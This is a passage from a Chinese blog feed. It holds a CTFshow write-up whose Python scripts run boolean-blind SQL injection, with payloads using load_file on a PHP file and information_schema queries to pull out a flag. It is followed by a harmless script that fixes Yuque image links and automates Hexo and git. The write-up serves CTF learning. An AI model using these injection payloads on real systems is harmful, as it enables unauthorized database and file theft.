alt="image.png"><br>python基础太差了，就这还是照着wp的解法写的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL布尔盲注.py</span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/11 18:48   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://2daeac7e-8170-4826-9997-2b4a8a6ec9ca.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqr-stuvwxyz0123456789&#123;&lt;&gt;$=,;_ &#125;&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先找flag在哪：</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_flag</span>():</span><br><span class="line">    left = <span class="number">0</span></span><br><span class="line">    right = <span class="number">1000</span>  <span class="comment"># 这里根据实际情况进行修改</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = (left + right) // <span class="number">2</span>  <span class="comment"># //floor整除</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;if(locate(&quot;&#x27;</span> + flag_pre + <span class="string">&#x27;&quot;,load_file(&quot;/var/www/html/api/index.php&quot;))&gt;&#123;&#125;,0,1)&#x27;</span>.<span class="built_in">format</span>(mid),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;密码错误&#x27;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(mid)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">pos1, flag_pre1, stra</span>):</span><br><span class="line">    pos1 += <span class="built_in">len</span>(flag_pre1)+<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> stra:</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;if(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),0,1)&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(pos1), j),</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">            <span class="comment"># print(data)</span></span><br><span class="line">            <span class="comment"># print(r.json()[&#x27;msg&#x27;])</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;密码错误&#x27;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">                flag_pre1 += j</span><br><span class="line">                pos1 += <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">        <span class="built_in">print</span>(flag_pre1)</span><br><span class="line">    <span class="keyword">return</span> flag_pre1</span><br><span class="line"></span><br><span class="line">pos = find_flag()</span><br><span class="line"><span class="built_in">print</span>(get_flag(pos, flag_pre, str1))</span><br></pre></td></tr></table></figure><h2 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h2><p>这里面payload是不能使用单引号的，单引号会导致前面闭合以至于不能够查询。要使用双引号。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689075867993-0f9922b1-6204-4e3a-842a-5063ace97744.png" alt="image.png"></p><h1 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h1><p>在查询语句里面加了单引号<code>username = &#39;&#123;$username&#125;&#39;</code><br>不用读文件了，直接就读数据就可以。<br>payload：<br><code>username=admin&#39;||1||&#39;</code><br>那就可以把上面那个payload去掉第一段方法。<br>找到布尔盲注构造位置：<br><code>username=admin&#39;and+0#&amp;password=0</code>：<br>返回用户名不存在<br><code>username=admin&#39;and+1#&amp;password=0</code>：<br>返回密码错误<br>由此编写脚本：（20min）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL布尔盲注2.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/11 22:02   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://96880f33-872c-4e26-9e91-a87d096bb6e2.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$=,;_ -&#125;&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;and+if(substr(database(),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;admin&#x27;and+if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload.<span class="built_in">format</span>(i, j),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="comment"># print(r.json()[&#x27;msg&#x27;])</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;密码错误&#x27;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分别修改payload参数可以得到需要的名称：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;admin&#x27;and+if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br></pre></td></tr></table></figure><p><code>ctfshow_fl0g,ctfshow_user</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;admin&#x27;and+if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br></pre></td></tr></table></figure><p><code>id,f1ag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL布尔盲注2.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/11 22:02   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://96880f33-872c-4e26-9e91-a87d096bb6e2.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$=,;_ -&#125;&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;and+if(substr(database(),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;and+if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;admin&#x27;and+if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload.<span class="built_in">format</span>(i, j),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="comment"># print(r.json()[&#x27;msg&#x27;])</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;密码错误&#x27;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果脚本编写异常，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="built_in">print</span>(r.json()[<span class="string">&#x27;msg&#x27;</span>])</span><br></pre></td></tr></table></figure><p>这俩玩应是非常有用的。<br>如果由于因为太快导致的json报错，可以手动加一行休眠</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time </span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br></pre></td></tr></table></figure><p>即可</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Python脚本修改语雀导文件图片格式</title>
      <link href="/2023/07/09/%E4%BD%BF%E7%94%A8Python%E8%84%9A%E6%9C%AC%E4%BF%AE%E6%94%B9%E8%AF%AD%E9%9B%80%E5%AF%BC%E5%87%BAmd%E6%96%87%E4%BB%B6%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F/"/>
      <url>/2023/07/09/%E4%BD%BF%E7%94%A8Python%E8%84%9A%E6%9C%AC%E4%BF%AE%E6%94%B9%E8%AF%AD%E9%9B%80%E5%AF%BC%E5%87%BAmd%E6%96%87%E4%BB%B6%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>用了语雀的md编辑器，感觉typora有点用不惯，但是语雀的到处图片会有限制，虽然能够浏览，但是使用hexo之后就不行了，寻找了几个方法，最好用的就是修改图片格式，将地址后的参数删除掉。<br>一个一个改太费劲了，因此写了一个简单的python脚本来代替机械劳动。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   YuQueShareLink.py</span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog :   natro92.github.io</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/5/16 21:04   natro92      1.0         将语雀链接在导出到博客时可以正常使用</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">replace_string_in_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        content = file.read()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 使用正则表达式匹配所有符合条件的字符串，并进行替换操作</span></span><br><span class="line">    replaced_content = re.sub(<span class="string">r&quot;.png)&quot;</span>, <span class="string">&quot;.png)&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(replaced_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请提供需要处理的文件路径, 且文件需要和该py脚本处在同一文件夹下，比如：我的博客.md&quot;</span>)</span><br><span class="line">    file_path = <span class="built_in">input</span>(<span class="string">&quot;路径：&quot;</span>)</span><br><span class="line">    is_end_of_md = re.search(<span class="string">r&quot;\.md&quot;</span>, file_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_end_of_md:</span><br><span class="line">        file_path += <span class="string">&quot;.md&quot;</span></span><br><span class="line">    replace_string_in_file(file_path)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>改完这个了，想要同步到hexo，需要有一步<code>hexo new 文章名称</code>，这样会生成一个文件头，一般我会把这个修改后的文章内容复制到那个新生成的文件，并且修改tag、category等参数。<br>那么能不能直接把这些东西都合并到一起呢？<br>通过万能的互联网，添加一点代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_headers_in_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    file_name = os.path.basename(file_path)</span><br><span class="line">    replaced_content = re.sub(<span class="string">r&quot;.md&quot;</span>, <span class="string">&quot;&quot;</span>, file_name)</span><br><span class="line">    time_str = datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r+&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        contents = f.read()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;当前tags:&#x27;</span>, [<span class="string">&#x27;WriteUp&#x27;</span>, <span class="string">&#x27;CTFshow0-1&#x27;</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;当前categories:&#x27;</span>, [<span class="string">&#x27;CTF&#x27;</span>])</span><br><span class="line">        new_tags = <span class="built_in">input</span>(<span class="string">&#x27;你想要修改tags吗？ (y/n) 默认n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> new_tags.lower() == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">            tags_str = <span class="built_in">input</span>(<span class="string">&#x27;输入你的tags，注意用英文逗号分隔: &#x27;</span>)</span><br><span class="line">            tags = [tag.strip() <span class="keyword">for</span> tag <span class="keyword">in</span> tags_str.split(<span class="string">&#x27;,&#x27;</span>)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tags = [<span class="string">&#x27;WriteUp&#x27;</span>, <span class="string">&#x27;CTFshow0-1&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        new_categories = <span class="built_in">input</span>(<span class="string">&#x27;你想要修改tags吗？(y/n) 默认n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> new_categories.lower() == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">            categories_str = <span class="built_in">input</span>(<span class="string">&#x27;输入你的categories，注意用英文逗号分隔: &#x27;</span>)</span><br><span class="line">            categories = [category.strip() <span class="keyword">for</span> category <span class="keyword">in</span> categories_str.split(<span class="string">&#x27;,&#x27;</span>)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            categories = [<span class="string">&#x27;CTF&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        new_contents = <span class="string">&#x27;---\n&#x27;</span> \</span><br><span class="line">                       <span class="string">&#x27;title: &#x27;</span> + file_name + <span class="string">&#x27;\n&#x27;</span> \</span><br><span class="line">                                               <span class="string">&#x27;date: &#x27;</span> + time_str + <span class="string">&#x27;\n&#x27;</span> \</span><br><span class="line">                                                                     <span class="string">&#x27;tags:\n&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> tag <span class="keyword">in</span> tags:</span><br><span class="line">            new_contents += <span class="string">&#x27;  - &#x27;</span> + tag + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        new_contents += <span class="string">&#x27;categories:\n&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> category <span class="keyword">in</span> categories:</span><br><span class="line">            new_contents += <span class="string">&#x27;  - &#x27;</span> + category + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        new_contents += <span class="string">&#x27;---\n&#x27;</span> \</span><br><span class="line">                        + contents</span><br><span class="line"></span><br><span class="line">        f.seek(<span class="number">0</span>)</span><br><span class="line">        f.write(new_contents)</span><br></pre></td></tr></table></figure><p>这个功能完成了，下面就是一键上传和更新到私有仓库了。<br>其实这里是可以使用hexo自带的库（hexo-uploader）但是为了简化、简单代码，这里就调用powershell来实现hexo的生成的发布。并且远程git给私有仓库。<br>其实hexo自带备份功能，但是似乎会和文件存到一起。因此我还是选择了单独创一个仓库保存的方法。<br>调用cmd来跑命令，因为之前git的信息和hexo的配置已经配置过了，因此直接使用就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hexo_generate_and_deploy</span>():</span><br><span class="line">    <span class="comment"># cmd命令 cd后修改为你自己的blog文件夹位置</span></span><br><span class="line">    <span class="comment"># 字符串前面加r防止解析，或者将单斜杠转换为双斜杠</span></span><br><span class="line">    cmd = <span class="string">r&#x27;cd C:\Users\natro92\Desktop\blog &amp;&amp; hexo g &amp;&amp; hexo d&#x27;</span></span><br><span class="line">    p = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE)</span><br><span class="line">    <span class="built_in">print</span>(p.stdout.read().decode())</span><br><span class="line">    a = <span class="built_in">input</span>(<span class="string">&#x27;按任意键继续&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">git_backup</span>():</span><br><span class="line">    <span class="comment"># 实现备份git功能</span></span><br><span class="line">    <span class="comment"># 切换到本地的git仓库目录</span></span><br><span class="line">    repo_dir = <span class="string">r&#x27;C:\Users\natro92\Desktop\blog&#x27;</span></span><br><span class="line">    <span class="comment"># python3.6特性，格式化文本</span></span><br><span class="line">    cmd_cd = <span class="string">f&#x27;cd <span class="subst">&#123;repo_dir&#125;</span> &amp;&amp; &#x27;</span></span><br><span class="line">    cmd_add = <span class="string">&#x27;git add .&#x27;</span></span><br><span class="line">    commit_msg = <span class="string">&#x27;%date:~0,4%%date:~5,2%%date:~8,2%&#x27;</span></span><br><span class="line">    cmd_commit = <span class="string">f&#x27;git commit -m &quot;<span class="subst">&#123;commit_msg&#125;</span>&quot;&#x27;</span></span><br><span class="line">    cmd_push = <span class="string">&#x27;git push&#x27;</span></span><br><span class="line">    cmd = cmd_cd + cmd_add + <span class="string">&#x27; &amp;&amp; &#x27;</span> + cmd_commit + <span class="string">&#x27; &amp;&amp; &#x27;</span> + cmd_push</span><br><span class="line">    result = subprocess.run(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE)</span><br><span class="line">    <span class="built_in">print</span>(result.stdout.decode())</span><br></pre></td></tr></table></figure><p>就是简单的造轮子，但是能够让自己造轮子的效率更高。<br>附上完整版链接：<a href="https://github.com/natro92/YuQueShareLink">https://github.com/natro92/YuQueShareLink</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脚本 </tag>
            
            <tag> Shortcut </tag>
            
            <tag> 语雀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始的智慧树倍速油猴脚本（一）</title>
      <link href="/2023/07/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E6%99%BA%E6%85%A7%E6%A0%91%E5%80%8D%E9%80%9F%E6%B2%B9%E7%8C%B4%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2023/07/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E6%99%BA%E6%85%A7%E6%A0%91%E5%80%8D%E9%80%9F%E6%B2%B9%E7%8C%B4%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
